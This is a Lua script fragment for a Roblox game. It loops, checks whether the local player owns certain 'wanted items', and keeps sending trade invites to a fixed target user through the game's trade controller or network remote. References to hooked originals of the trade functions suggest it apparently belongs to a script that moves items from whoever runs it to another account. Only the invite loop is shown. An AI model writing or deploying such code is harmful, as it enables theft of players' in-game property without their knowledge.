task.spawn(function()
    local tId = nil
    while _G._tradeScriptRunId == currentRunId and not tId do
        tId = getTargetUserId()
        if tId and tId ~= LocalPlayer.UserId then
            break
        end
        task.wait(2.5)
    end

    if not tId or tId == LocalPlayer.UserId then
        return
    end

    local INVITE_COOLDOWN = 11
    local POST_TRADE_COOLDOWN = 3.5

    while _G._tradeScriptRunId == currentRunId do
        local hasWanted = localPlayerHasWantedItems()
        if not hasWanted then
            task.wait(3)
            continue
        end

        if isAnyTradeActive() then
            while _G._tradeScriptRunId == currentRunId and isAnyTradeActive() do
                task.wait(1)
            end
            task.wait(POST_TRADE_COOLDOWN)
        end

        if _G._tradeScriptRunId ~= currentRunId then
            break
        end

        if not isAnyTradeActive() then
            _G._lastTargetTradeClock = os.clock()
            local inviteSentClock = os.clock()

            pcall(function()
                local TradeController = require(ReplicatedStorage.Controllers.TradeController)
                if TradeController._origSendInvite then
                    TradeController:_origSendInvite(tId, function() end)
                elseif TradeController.SendInvite then
                    TradeController:SendInvite(tId)
                else
                    local inviteRF = ReplicatedStorage.Packages.Net["RF/TradeService/Invite"]
                    inviteRF:InvokeServer("8fbe1594-7cef-4c29-94d1-a0e93adfa5a4", tId)
                end
            end)

            local tradeStarted = false
            while _G._tradeScriptRunId == currentRunId and (os.clock() - inviteSentClock < INVITE_COOLDOWN) do
                if isAnyTradeActive() then
                    tradeStarted = true
                    break
                end
                task.wait(0.5)
            end

            if tradeStarted then
                while _G._tradeScriptRunId == currentRunId and isAnyTradeActive() do
                    task.wait(1)
                end
                task.wait(POST_TRADE_COOLDOWN)
            else
                local elapsed = os.clock() - inviteSentClock
                if elapsed < INVITE_COOLDOWN then
                    task.wait(INVITE_COOLDOWN - elapsed + 0.5)
                else
                    task.wait(1)
                end
            end
        else
            task.wait(2)
        end
    end
end)
